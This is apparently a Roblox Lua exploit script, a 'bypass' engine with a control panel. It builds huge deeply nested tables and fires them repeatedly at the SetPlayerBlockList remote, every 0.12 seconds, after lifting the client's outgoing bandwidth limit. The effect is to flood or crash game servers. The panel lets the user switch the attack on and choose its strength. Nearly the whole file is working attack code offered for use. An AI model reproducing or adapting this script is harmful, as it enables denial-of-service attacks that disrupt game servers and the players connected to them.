-- WAEL BYPASS STANDALONE
-- Extracted from WAEL(3)_HORIZON_TPBAT.lua.
-- This file contains only the WAEL Bypass engine and its panel.

local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local Player = Players.LocalPlayer or Players:WaitForChild("LocalPlayer", 10)
if not Player then return end
local LP = Player

-- Remove an older copy of this standalone panel if it exists.
pcall(function()
    local core = game:GetService("CoreGui")
    local old = core:FindFirstChild("CrystalBypassGUI")
    if old then old:Destroy() end
    local pg = Player:FindFirstChild("PlayerGui")
    if pg then
        old = pg:FindFirstChild("CrystalBypassGUI")
        if old then old:Destroy() end
    end
end)

-- ========== BYPASS ENGINE (Eclipse powers) ==========
local BypassConfig = {
	Power = 97000,
	PCPower = 97000,
	MobilePower = 72000,
	Mode = UIS.TouchEnabled and "Mobile" or "PC",
	SpamDelay = 0.12,
	Version = "V1",
}
local bypassRunning, bypassBomb, bypassThread = false, nil, nil

local function buildBombV1(power)
	local depth, main, spam = 186, {}, {{}}
	local z = spam[1]
	for _ = 1, depth do local t = {}; table.insert(z, t); z = t end
	local maxRep = math.floor(power / (depth + 2))
	for _ = 1, maxRep do table.insert(main, spam) end
	return main
end
local function buildBombV2(power)
	local depth, main, spam = 296, {}, {{}}
	local z = spam[1]
	for _ = 1, depth do local t = {}; table.insert(z, t); z = t end
	local maxRep = math.floor(power / (depth + 2))
	for _ = 1, maxRep do table.insert(main, spam) end
	return main
end
local function buildBomb(power)
	return BypassConfig.Version == "V1" and buildBombV1(power) or buildBombV2(power)
end
local function startBypass()
	if bypassRunning then return end
	bypassRunning = true
	pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
	bypassBomb = buildBomb(BypassConfig.Power)
	local rrs = game:FindFirstChild("RobloxReplicatedStorage")
	local remote = rrs and rrs:FindFirstChild("SetPlayerBlockList")
	if not remote then bypassRunning = false; return end
	bypassThread = task.spawn(function()
		while bypassRunning do
			if bypassBomb then pcall(function() remote:FireServer(bypassBomb) end) end
			task.wait(BypassConfig.SpamDelay)
		end
	end)
end
local function stopBypass()
	bypassRunning = false
	bypassBomb = nil
	pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
end
_G.CrystalBypass = {
	SetBypass = function(on) if on then startBypass() else stopBypass() end end,
	IsEnabled = function() return bypassRunning end,
	Start = startBypass,
	Stop = stopBypass,
	SetVersion = function(v)
		if v=="V1" or v=="V2" then
			BypassConfig.Version = v
			BypassConfig.Power = v=="V1" and 97000 or 100000
			if bypassRunning then stopBypass(); startBypass() end
		end
	end,
	SetPower = function(p)
		BypassConfig.Power = math.clamp(tonumber(p) or 97000, 10000, 150000)
		if bypassRunning then stopBypass(); startBypass() end
	end,
	SetVisible = function() end,
}

-- ========== SIMPLE PANELS (open from Combat) ==========
local function parentGui(sg)
	pcall(function() sg.Parent = game:GetService("CoreGui") end)
	if not sg.Parent then pcall(function() sg.Parent = Player:WaitForChild("PlayerGui") end) end
end

local function makePanel(name, title, w, h)
	local sg = Instance.new("ScreenGui")
	sg.Name = name
	sg.ResetOnSpawn = false
	sg.IgnoreGuiInset = true
	sg.DisplayOrder = 130
	parentGui(sg)
	local main = Instance.new("Frame")
	main.Name = "Main"
	main.Size = UDim2.fromOffset(w, h)
	main.Position = UDim2.new(0.5, -w/2, 0.5, -h/2)
	main.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
	main.BorderSizePixel = 0
	main.Active = true
	main.Parent = sg
	Instance.new("UICorner", main).CornerRadius = UDim.new(0, 14)
	local st = Instance.new("UIStroke", main)
	st.Color = Color3.fromRGB(40, 40, 40)
	st.Thickness = 1
	local t = Instance.new("TextLabel", main)
	t.Size = UDim2.new(1, -40, 0, 28)
	t.Position = UDim2.fromOffset(12, 8)
	t.BackgroundTransparency = 1
	t.Text = title
	t.Font = Enum.Font.GothamBlack
	t.TextSize = 14
	t.TextColor3 = Color3.fromRGB(255, 255, 255)
	t.TextXAlignment = Enum.TextXAlignment.Left
	local close = Instance.new("TextButton", main)
	close.Size = UDim2.fromOffset(28, 28)
	close.Position = UDim2.new(1, -34, 0, 6)
	close.BackgroundTransparency = 1
	close.Text = "X"
	close.TextColor3 = Color3.fromRGB(160, 160, 170)
	close.Font = Enum.Font.GothamBold
	close.TextSize = 14
	close.MouseButton1Click:Connect(function() sg.Enabled = false end)
	-- drag
	local dragging, d0, p0
	main.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true; d0 = input.Position; p0 = main.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then dragging = false end
			end)
		end
	end)
	UIS.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local d = input.Position - d0
			main.Position = UDim2.new(p0.X.Scale, p0.X.Offset + d.X, p0.Y.Scale, p0.Y.Offset + d.Y)
		end
	end)
	return sg, main
end

_G.__openBypassGUI = function(openPanel)
	if openPanel == false then return end
	local existing = game:GetService("CoreGui"):FindFirstChild("CrystalBypassGUI")
		or (Player:FindFirstChild("PlayerGui") and Player.PlayerGui:FindFirstChild("CrystalBypassGUI"))
	if existing then existing.Enabled = true; return end
	local sg, main = makePanel("CrystalBypassGUI", "ECLIPSE BYPASS", 280, 200)
	local status = Instance.new("TextLabel", main)
	status.Size = UDim2.new(1, -24, 0, 18)
	status.Position = UDim2.fromOffset(12, 40)
	status.BackgroundTransparency = 1
	status.Text = "STATUS · OFF"
	status.Font = Enum.Font.GothamMedium
	status.TextSize = 12
	status.TextColor3 = Color3.fromRGB(160, 160, 170)
	status.TextXAlignment = Enum.TextXAlignment.Left
	local powerLbl = Instance.new("TextLabel", main)
	powerLbl.Size = UDim2.new(1, -24, 0, 16)
	powerLbl.Position = UDim2.fromOffset(12, 62)
	powerLbl.BackgroundTransparency = 1
	powerLbl.Text = "Power: " .. tostring(BypassConfig.Power) .. "  |  " .. BypassConfig.Version
	powerLbl.Font = Enum.Font.Gotham
	powerLbl.TextSize = 11
	powerLbl.TextColor3 = Color3.fromRGB(120, 120, 130)
	powerLbl.TextXAlignment = Enum.TextXAlignment.Left
	local function refresh()
		status.Text = bypassRunning and "STATUS · ACTIVE" or "STATUS · OFF"
		status.TextColor3 = bypassRunning and Color3.fromRGB(120, 255, 160) or Color3.fromRGB(160, 160, 170)
		powerLbl.Text = "Power: " .. tostring(BypassConfig.Power) .. "  |  " .. BypassConfig.Version
	end
	local btn = Instance.new("TextButton", main)
	btn.Size = UDim2.new(1, -24, 0, 36)
	btn.Position = UDim2.fromOffset(12, 90)
	btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	btn.Text = "ENABLE BYPASS"
	btn.Font = Enum.Font.GothamBlack
	btn.TextSize = 13
	btn.TextColor3 = Color3.fromRGB(12, 12, 16)
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
	btn.MouseButton1Click:Connect(function()
		if bypassRunning then stopBypass() else startBypass() end
		btn.Text = bypassRunning and "DISABLE BYPASS" or "ENABLE BYPASS"
		btn.BackgroundColor3 = bypassRunning and Color3.fromRGB(220, 50, 60) or Color3.fromRGB(255, 255, 255)
		btn.TextColor3 = bypassRunning and Color3.fromRGB(255,255,255) or Color3.fromRGB(12,12,16)
		refresh()
	end)
	local v1 = Instance.new("TextButton", main)
	v1.Size = UDim2.new(0.45, -8, 0, 28)
	v1.Position = UDim2.fromOffset(12, 140)
	v1.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
	v1.Text = "V1"
	v1.TextColor3 = Color3.fromRGB(255,255,255)
	v1.Font = Enum.Font.GothamBold
	Instance.new("UICorner", v1).CornerRadius = UDim.new(0, 6)
	local v2 = Instance.new("TextButton", main)
	v2.Size = UDim2.new(0.45, -8, 0, 28)
	v2.Position = UDim2.new(0.55, 0, 0, 140)
	v2.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
	v2.Text = "V2"
	v2.TextColor3 = Color3.fromRGB(255,255,255)
	v2.Font = Enum.Font.GothamBold
	Instance.new("UICorner", v2).CornerRadius = UDim.new(0, 6)
	v1.MouseButton1Click:Connect(function() _G.CrystalBypass.SetVersion("V1"); refresh() end)
	v2.MouseButton1Click:Connect(function() _G.CrystalBypass.SetVersion("V2"); refresh() end)
	refresh()
end

-- Open the extracted Bypass panel immediately when this standalone file runs.
pcall(function()
    if _G.__openBypassGUI then
        _G.__openBypassGUI(true)
    end
end)
